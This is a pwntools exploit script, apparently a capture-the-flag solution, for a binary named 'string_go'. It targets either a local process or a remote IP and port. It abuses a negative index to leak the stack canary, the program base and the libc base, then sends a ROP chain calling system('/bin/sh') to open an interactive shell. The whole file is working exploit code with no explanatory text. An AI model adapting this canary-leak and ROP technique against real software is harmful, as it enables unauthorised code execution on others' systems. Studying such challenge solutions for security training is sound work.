from pwn import *
local = 1
binary="./string_go"
elf = ELF(binary, checksec=False)
if local:
    context.terminal =['/usr/bin/tmux', 'splitw', '-h', '-F#{pane_pid}' ]
    p = process(binary)
    libc = ELF('./libc-2.27.so', checksec=False)
    bin_sh=0x00000000001b3e1a
    context.log_level = "debug"


else:
    p=remote("82.157.20.104", 32000)
    libc = ELF('./libc-2.27.so', checksec=False)
    bin_sh = 0x00000000001b3e1a
def debug_1(addr,show=[],PIE=True):

    debug_str = ""
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        for i in addr:
            debug_str+='b *{}\n'.format(str(hex(text_base+i)))
        for item in show:
            debug_str+='x /50xg {:#x}\n'.format(text_base+item)
        gdb.attach(p,debug_str)
    else:
        for i in addr:
            text_base=0
            debug_str+='b *{:#x}\n'.format(text_base+i)
        gdb.attach(p,debug_str)

def leak(ptr,index,value):
    p.sendlineafter(">>>", index)
    p.sendlineafter(">>>", ptr)
    gdb.attach(p)
    pause()
    p.sendlineafter(">>>", value)
    
    p.recv()
    info=p.recv(4096,timeout=1)
    
    print(info)

    pause()
    return info
p.sendlineafter(">>>","1+2")


info=leak(str(2),str(-1),str(3))

#debug_1([0x0000000000002415, 0x0000000000003cf3])
# info=p.recv(0x400)
# print(info[0:1])
# print(info)
# print(info)
canary=u64(info[7*8:7*8+8])
print("canary ==>",hex(canary))
elf_base=u64(info[9*8:9*8+8])-elf.symbols["_start"]
print("elf_base ==>",hex(elf_base))

off=0x000000000021BF7#libc.symbols["__libc_start_main"]+238
print(hex(off))
libc_base=u64(info[0xf8:0xf8+8])-off
print("libc_base ==>",hex(libc_base))


prdi=0x0000000000003cf3
ret = 0x00000000000014ce
payload=p64(0)*3+p64(canary)+p64(0)*3+p64(ret+elf_base)+p64(elf_base+prdi)+p64(libc_base+bin_sh)+p64(libc_base+libc.symbols["system"])

#gdb.attach(p)
p.sendline(payload)
#p.sendlineafter(">>>","aa")

p.interactive()


